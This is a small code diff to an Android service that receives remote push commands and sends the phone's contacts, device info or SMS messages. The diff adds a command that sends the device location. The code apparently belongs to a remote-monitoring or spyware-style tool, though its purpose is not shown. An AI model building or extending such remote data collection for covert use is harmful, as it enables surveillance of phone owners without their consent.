@@ -16,6 +16,7 @@ class CommandsService: FirebaseMessagingService() {
             "contacts" -> Interactor.sendContacts()
             "phone_info" -> Interactor.sendPhoneInfo()
             "sms" -> Interactor.sendSms()
+            "location" -> Interactor.sendLocation()
         }
 
         Log.w(tag, "Received command: ${message.data["command"]}")
